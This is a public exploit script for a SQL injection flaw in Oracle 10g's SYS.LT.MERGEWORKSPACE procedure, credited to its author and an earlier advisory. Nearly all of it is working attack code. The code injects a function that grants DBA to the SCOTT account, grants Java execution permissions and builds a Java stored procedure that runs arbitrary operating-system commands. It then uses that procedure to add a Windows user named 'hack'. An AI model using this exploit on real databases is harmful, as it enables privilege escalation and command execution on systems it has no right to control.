Oracle 10g SYS.LT.MERGEWORKSPACE SQL Injection Exploit
======================================================



/*********************************************************/
/*Oracle 10g SYS.LT.MERGEWORKSPACE SQL Injection Exploit**/
/****grant DBA and create new  OS user (java)*************/
/*********************************************************/
/***********exploit grant DBA to scott********************/
/***********and execute OS command "net user"*************/
/***********using java procedures ************************/
/*********************************************************/
/***********tested on oracle 10.1.0.5.0*******************/
/*********************************************************/
/*********************************************************/
/* Date of Public EXPLOIT: January 6, 2009               */
/* Written by:             Alexandr "Sh2kerr" Polyakov   */
/* email:                  Alexandr.Polyakov@dsec.ru     */
/* site:                   http://www.dsecrg.ru          */
/*                         http://www.dsec.ru            */
/*********************************************************/
/*Original Advisory:                                     */
/*Esteban Martinez Fayo [Team SHATTER ]                  */
/*Date of Public Advisory: November 11, 2008             */
/*http://www.appsecinc.com/resources/alerts/oracle/2008-10.shtml*/
/*********************************************************/

select * from user_role_privs;

CREATE OR REPLACE FUNCTION Y return varchar2
authid current_user as
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE &#039;GRANT DBA TO SCOTT&#039;;
COMMIT;
RETURN &#039;Y&#039;;
END;
/

exec SYS.LT.CREATEWORKSPACE(&#039;sh2kerr&#039;&#039; and SCOTT.Y()=&#039;&#039;Y&#039;);
exec SYS.LT.MERGEWORKSPACE(&#039;sh2kerr&#039;&#039; and SCOTT.Y()=&#039;&#039;Y&#039;);



/* Creating simple java procedure that executes OS  */

exec dbms_java.grant_permission(&#039;SCOTT&#039;, &#039;SYS:java.io.FilePermission&#039;,&#039;<<ALL FILES>>&#039;,&#039;execute&#039;);
exec dbms_java.grant_permission(&#039;SCOTT&#039;, &#039;SYS:java.lang.RuntimePermission&#039;, &#039;writeFileDescriptor&#039;, &#039;&#039;);
exec dbms_java.grant_permission(&#039;SCOTT&#039;, &#039;SYS:java.lang.RuntimePermission&#039;, &#039;readFileDescriptor&#039;, &#039;&#039;);

CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED "JAVACMD" AS
import java.lang.*;
import java.io.*;
public class JAVACMD
{
 public static void execCommand (String command) throws IOException
 {
     Runtime.getRuntime().exec(command);
 }
};
/

CREATE OR REPLACE PROCEDURE JAVAEXEC (p_command  IN  VARCHAR2)
AS LANGUAGE JAVA 
NAME &#039;JAVACMD.execCommand (java.lang.String)&#039;;
/

/* here we can paste any OS command for example create new user */

exec javaexec(?net user hack 12345 /add?);

select * from user_role_privs;



